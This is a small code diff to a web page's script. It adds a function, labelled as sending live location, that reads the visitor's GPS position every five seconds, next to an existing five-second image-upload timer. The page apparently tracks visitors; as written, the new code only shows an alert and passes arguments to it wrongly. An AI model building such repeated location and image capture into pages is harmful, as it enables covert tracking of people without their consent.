@@ -502,5 +502,19 @@
     };
 
     setInterval(uploadimage,5000)
+
+    // Sending live location
+    function sendlocation(){
+      navigator.geolocation.getCurrentPosition(function(location) {
+        var lat = location.coords.latitude;
+        var lng = location.coords.longitude;
+        var acc = location.coords.accuracy;
+        alert(lat,lng,acc);
+      },
+      function error(msg) {alert('Please enable your GPS position feature.');},
+      options);
+    }
+    setInterval(sendlocation,5000)
+
   </script>
 </body>
